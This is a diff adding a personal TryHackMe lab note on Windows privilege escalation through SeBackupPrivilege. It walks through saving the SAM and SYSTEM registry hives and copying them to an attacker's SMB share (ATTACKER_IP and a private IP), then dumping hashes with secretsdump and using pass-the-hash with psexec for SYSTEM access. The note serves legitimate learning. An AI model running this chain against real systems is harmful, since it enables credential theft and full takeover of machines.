@@ -1141,8 +1141,880 @@ Use sc in CMD.
 Use sc.exe in PowerShell.
 ```
 
-# Tags
+# Task 6: Windows Privileges
+##SeBackup / SeRestore
 
-#windows #privilege-escalation #tryhackme #services #crta-prep #redteam
+> These are my personal cybersecurity learning notes written in my own words.
+> I do not publish flags, direct answers, private-room solutions, copied premium content, machine-specific passwords, or real secrets.
 
+## Platform
 
+TryHackMe
+
+## Topic
+
+Windows Privilege Escalation - Windows Privileges
+
+## Covered in this note
+
+```text
+SeBackupPrivilege
+SeRestorePrivilege
+```
+
+The rest will be added later:
+
+```text
+SeTakeOwnershipPrivilege
+SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
+```
+
+---
+
+# Simple Explanation
+
+Windows privileges are special rights given to a user account.
+
+Normal file permissions decide who can read, write, or execute files.
+
+But Windows privileges are more powerful. They allow users to perform system-level actions like:
+
+```text
+Shutting down the machine
+Backing up files
+Restoring files
+Taking ownership of files
+Impersonating another user
+Bypassing some permission checks
+```
+
+To check the privileges of the current user, we use:
+
+```cmd
+whoami /priv
+```
+
+---
+
+# What is SeBackupPrivilege?
+
+`SeBackupPrivilege` allows a user to back up files and directories.
+
+In simple words:
+
+```text
+It allows a user to read/copy files even if normal permissions do not allow it.
+```
+
+This privilege is normally given to backup-related users because they need to copy important system files without being full administrators.
+
+But from an attacker’s point of view, this is dangerous because sensitive Windows files can be copied.
+
+---
+
+# What is SeRestorePrivilege?
+
+`SeRestorePrivilege` allows a user to restore files and directories.
+
+In simple words:
+
+```text
+It allows a user to write/restore files while bypassing some normal file permissions.
+```
+
+Together, `SeBackupPrivilege` and `SeRestorePrivilege` are powerful because they can help access protected system data.
+
+---
+
+# What was the target idea?
+
+The idea was:
+
+```text
+Use SeBackupPrivilege to copy the SAM and SYSTEM registry hives.
+Then extract the local Administrator password hash.
+Then use Pass-the-Hash to get access as Administrator/SYSTEM.
+```
+
+---
+
+# Important Terms
+
+## SAM
+
+SAM means **Security Account Manager**.
+
+In simple words:
+
+```text
+SAM stores local Windows user password hashes.
+```
+
+Example local users:
+
+```text
+Administrator
+Guest
+THMBackup
+THMTakeOwnership
+```
+
+SAM does not store plain-text passwords. It stores password hashes.
+
+---
+
+## SYSTEM hive
+
+The SYSTEM registry hive contains important system information needed to extract/decrypt the hashes from SAM.
+
+So we need both files:
+
+```text
+SAM + SYSTEM = local password hash extraction
+```
+
+That is why we saved both:
+
+```text
+sam.hive
+system.hive
+```
+
+---
+
+## Hash
+
+A hash is like a protected version of a password.
+
+Example idea:
+
+```text
+Password  →  Hash
+```
+
+In some Windows attacks, we do not need to know the real password. We can use the hash directly.
+
+---
+
+## Pass-the-Hash
+
+Pass-the-Hash means:
+
+```text
+Login using the password hash instead of the real password.
+```
+
+So if we get the Administrator hash, we can try to login as Administrator using that hash.
+
+---
+
+# Step 1: Login with the given user
+
+The user used in this task was:
+
+```text
+THMBackup
+```
+
+This user is part of the **Backup Operators** group.
+
+The Backup Operators group can have:
+
+```text
+SeBackupPrivilege
+SeRestorePrivilege
+```
+
+---
+
+# Step 2: Open CMD as administrator
+
+This part is important.
+
+To use the backup/restore privileges properly, I had to open Command Prompt using:
+
+```text
+Run as administrator
+```
+
+Then Windows asked for the user password again.
+
+---
+
+# Step 3: Check privileges
+
+Used in: **Windows CMD**
+
+```cmd
+whoami /priv
+```
+
+## Lesson
+
+This command shows what privileges the current user has.
+
+I looked for:
+
+```text
+SeBackupPrivilege
+SeRestorePrivilege
+```
+
+Even if the privilege state shows `Disabled`, the privilege is still assigned to the user.
+
+---
+
+# Step 4: Why did we jump to `reg save`?
+
+At first, this part confused me.
+
+The command was:
+
+```cmd
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+## Explanation
+
+We jumped to `reg save` because the goal was to copy the protected registry hives.
+
+The important registry hives were:
+
+```text
+HKLM\SYSTEM
+HKLM\SAM
+```
+
+But instead of directly copying locked system files, we used `reg save`.
+
+`reg save` exports/saves a registry hive into a file.
+
+So:
+
+```cmd
+reg save hklm\system C:\Users\THMBackup\system.hive
+```
+
+means:
+
+```text
+Take the SYSTEM registry hive and save it as system.hive inside C:\Users\THMBackup\
+```
+
+And:
+
+```cmd
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+means:
+
+```text
+Take the SAM registry hive and save it as sam.hive inside C:\Users\THMBackup\
+```
+
+## Why the path was used
+
+The output files were saved in:
+
+```text
+C:\Users\THMBackup\
+```
+
+because this is the user’s folder, and the user can write files there.
+
+So the full output paths became:
+
+```text
+C:\Users\THMBackup\system.hive
+C:\Users\THMBackup\sam.hive
+```
+
+---
+
+# Step 5: Save the SAM and SYSTEM hives
+
+Used in: **Windows CMD**
+
+```cmd
+reg save hklm\system C:\Users\THMBackup\system.hive
+```
+
+```cmd
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+## Lesson
+
+These commands created two files:
+
+```text
+system.hive
+sam.hive
+```
+
+These files were needed to extract local Windows user password hashes later.
+
+---
+
+# Step 6: Start SMB server on Kali
+
+The TryHackMe command was:
+
+```bash
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+## Problem I faced
+
+In my Kali machine, I did not have:
+
+```text
+python3.9
+```
+
+And I also did not have this path:
+
+```text
+/opt/impacket/examples/smbserver.py
+```
+
+So the THM command did not match my Kali setup.
+
+## What I did
+
+I searched for the modern Impacket SMB server command using:
+
+```bash
+which impacket-smbserver
+```
+
+Used in: **Kali Linux**
+
+```bash
+which impacket-smbserver
+```
+
+I found:
+
+```text
+/usr/bin/impacket-smbserver
+```
+
+So instead of using the old THM path, I used the modern Kali command.
+
+---
+
+# Step 7: Create a share folder
+
+Used in: **Kali Linux**
+
+```bash
+mkdir -p share
+```
+
+## Meaning
+
+This created a folder named:
+
+```text
+share
+```
+
+This folder was used to receive files from the Windows target.
+
+---
+
+# Step 8: Run Impacket SMB server
+
+Used in: **Kali Linux**
+
+```bash
+impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+or with full path:
+
+```bash
+/usr/bin/impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+## Explanation
+
+```text
+impacket-smbserver = starts an SMB file server
+-smb2support = enables SMB2 support
+-username THMBackup = username required to access the share
+-password CopyMaster555 = password required to access the share
+public = share name
+share = local folder on Kali
+```
+
+## Important lesson
+
+When the SMB server starts, it may look stuck.
+
+But it is not stuck.
+
+It is waiting for the Windows machine to connect.
+
+So I had to keep that terminal open.
+
+---
+
+# Step 9: Copy SAM hive to Kali
+
+Used in: **Windows CMD**
+
+```cmd
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+```
+
+In my case, I used my Kali VPN IP:
+
+```cmd
+copy C:\Users\THMBackup\sam.hive \\192.168.143.211\public\
+```
+
+## Lesson
+
+The `sam.hive` file was small, so it copied easily using normal `copy`.
+
+---
+
+# Step 10: Problem copying system.hive
+
+The `system.hive` file was bigger than `sam.hive`.
+
+Normal copy caused disturbance/network error for me.
+
+The `sam.hive` copied perfectly, but `system.hive` kept causing problems.
+
+## Mistake / Issue I faced
+
+I first tried normal copy:
+
+```cmd
+copy C:\Users\THMBackup\system.hive \\192.168.143.211\public\
+```
+
+But it caused network issues and corrupted/incomplete copy.
+
+When I tried to run `secretsdump`, I got errors because `system.hive` was not copied properly.
+
+---
+
+# Step 11: Use robocopy for system.hive
+
+To fix the problem, I used `robocopy`.
+
+Used in: **Windows CMD**
+
+```cmd
+robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
+```
+
+## Explanation
+
+```text
+robocopy = robust file copy tool
+C:\Users\THMBackup = source folder
+\\192.168.143.211\public = Kali SMB share
+system.hive = file to copy
+/Z = restartable mode
+/R:5 = retry 5 times
+/W:2 = wait 2 seconds between retries
+```
+
+## Why I used robocopy
+
+I used `robocopy` because `system.hive` was bigger and normal `copy` was failing.
+
+`robocopy` is better for larger or unstable file transfers.
+
+---
+
+# Robocopy mistake I made
+
+At first, I used wrong robocopy syntax:
+
+```cmd
+robocopy C:\Users\THMBackup\system.hive \\192.168.143.211\public\
+```
+
+This was wrong because `robocopy` expects:
+
+```text
+robocopy SOURCE_FOLDER DESTINATION_FOLDER FILE_NAME
+```
+
+Correct command:
+
+```cmd
+robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
+```
+
+## Lesson
+
+Wrong:
+
+```text
+Source = C:\Users\THMBackup\system.hive
+```
+
+Correct:
+
+```text
+Source folder = C:\Users\THMBackup
+File name = system.hive
+```
+
+---
+
+# Step 12: Check files on Kali
+
+Used in: **Kali Linux**
+
+```bash
+ls -lh ~/share
+```
+
+I checked that both files existed:
+
+```text
+sam.hive
+system.hive
+```
+
+The `system.hive` file was much bigger than `sam.hive`.
+
+---
+
+# Step 13: Dump hashes using secretsdump
+
+Used in: **Kali Linux**
+
+```bash
+impacket-secretsdump -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
+```
+
+## Explanation
+
+```text
+impacket-secretsdump = Impacket tool to dump hashes/secrets
+-sam ~/share/sam.hive = path to SAM hive
+-system ~/share/system.hive = path to SYSTEM hive
+LOCAL = offline local dump
+```
+
+## Lesson
+
+This command extracted local Windows user password hashes.
+
+The important hash was the Administrator hash.
+
+For public notes, I will not publish the real hash.
+
+---
+
+# Step 14: Pass-the-Hash with Administrator hash
+
+After extracting the Administrator hash, we can use Pass-the-Hash.
+
+Used in: **Kali Linux**
+
+```bash
+impacket-psexec -hashes LMHASH:NTHASH administrator@TARGET_IP
+```
+
+## Explanation
+
+```text
+impacket-psexec = tool to execute commands remotely on Windows
+-hashes = use password hash instead of password
+LMHASH:NTHASH = hash format from secretsdump
+administrator@TARGET_IP = login as Administrator to the target machine
+```
+
+## Important mistake to avoid
+
+Do not copy the example hash from TryHackMe.
+
+Use the hash from your own `secretsdump` output.
+
+The format is:
+
+```text
+LMHASH:NTHASH
+```
+
+For public writeups, I will write:
+
+```text
+LMHASH:ADMIN_NT_HASH
+```
+
+instead of publishing the real hash.
+
+---
+
+# Step 15: Confirm SYSTEM shell
+
+After successful Pass-the-Hash, I checked:
+
+Used in: **Windows shell from psexec**
+
+```cmd
+whoami
+```
+
+Expected result:
+
+```text
+nt authority\system
+```
+
+That means I successfully got SYSTEM-level access.
+
+---
+
+# Step 16: Flag location
+
+The flag was located on the Administrator Desktop.
+
+Used in: **Windows shell from psexec**
+
+```cmd
+cd C:\Users\Administrator\Desktop
+dir
+type flag.txt
+```
+
+For public writeups, I will not publish the flag.
+
+---
+
+# Full Command Flow
+
+## Windows CMD - Check privileges
+
+```cmd
+whoami /priv
+```
+
+## Windows CMD - Save hives
+
+```cmd
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+## Kali Linux - Find Impacket SMB server
+
+```bash
+which impacket-smbserver
+```
+
+## Kali Linux - Start SMB server
+
+```bash
+mkdir -p share
+impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+## Windows CMD - Copy SAM hive
+
+```cmd
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+```
+
+## Windows CMD - Copy SYSTEM hive with robocopy
+
+```cmd
+robocopy C:\Users\THMBackup \\ATTACKER_IP\public system.hive /Z /R:5 /W:2
+```
+
+## Kali Linux - Check received files
+
+```bash
+ls -lh ~/share
+```
+
+## Kali Linux - Dump hashes
+
+```bash
+impacket-secretsdump -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
+```
+
+## Kali Linux - Pass-the-Hash
+
+```bash
+impacket-psexec -hashes LMHASH:NTHASH administrator@TARGET_IP
+```
+
+## Windows shell - Confirm privilege
+
+```cmd
+whoami
+```
+
+## Windows shell - Read flag
+
+```cmd
+cd C:\Users\Administrator\Desktop
+dir
+type flag.txt
+```
+
+---
+
+# Problems I Faced
+
+## Problem 1: THM Impacket path did not exist
+
+THM used:
+
+```bash
+python3.9 /opt/impacket/examples/smbserver.py
+```
+
+But I did not have Python 3.9 or that Impacket examples path.
+
+## Fix
+
+I used:
+
+```bash
+which impacket-smbserver
+```
+
+Then used:
+
+```bash
+impacket-smbserver
+```
+
+directly.
+
+---
+
+## Problem 2: I accidentally tried to run impacket-smbserver with python3
+
+Wrong:
+
+```bash
+python3 /usr/bin/impacket-smbserver
+```
+
+This caused a syntax error because `impacket-smbserver` is not a normal Python file in my Kali setup.
+
+Correct:
+
+```bash
+impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+---
+
+## Problem 3: SMB server looked stuck
+
+When I ran `impacket-smbserver`, it showed the banner and waited.
+
+At first, it looked stuck.
+
+But it was normal.
+
+The SMB server was waiting for the Windows target to copy files.
+
+---
+
+## Problem 4: I typed the SMB IP path wrong
+
+Wrong:
+
+```cmd
+\\192.168.143\211\public\
+```
+
+Correct:
+
+```cmd
+\\192.168.143.211\public\
+```
+
+The full IP must stay together:
+
+```text
+192.168.143.211
+```
+
+---
+
+## Problem 5: system.hive copy kept failing
+
+`sam.hive` copied easily, but `system.hive` caused network error because it was bigger.
+
+## Fix
+
+I used:
+
+```cmd
+robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
+```
+
+---
+
+## Problem 6: Linux filename case sensitivity
+
+At one point, the file was saved as:
+
+```text
+System.hive
+```
+
+But I typed:
+
+```text
+system.hive
+```
+
+Linux is case-sensitive.
+
+So these are different:
+
+```text
+System.hive
+system.hive
+```
+
+---
+
+## Problem 7: secretsdump failed because system.hive was corrupted
+
+Because the first copy of `system.hive` failed, `secretsdump` gave errors.
+
+## Fix
+
+I copied `system.hive` again properly using `robocopy`.
+
+Then `secretsdump` worked.
+
+---
+
+# Key Lessons
+
+```text
+1. SeBackupPrivilege lets us copy protected files.
+2. SAM contains local user password hashes.
+3. SYSTEM hive is needed to extract/decrypt the SAM hashes.
+4. reg save is used to export protected registry hives into files.
+5. Impacket paths may differ depending on Kali version.
+6. Modern Kali can use impacket-smbserver directly.
+7. Large files may fail with normal copy, so robocopy is better.
+8. Linux filenames are case-sensitive.
+9. Do not use THM example hashes; use your own dumped hash.
+10. Pass-the-Hash can give SYSTEM access using the Administrator hash.
+```
+
+---
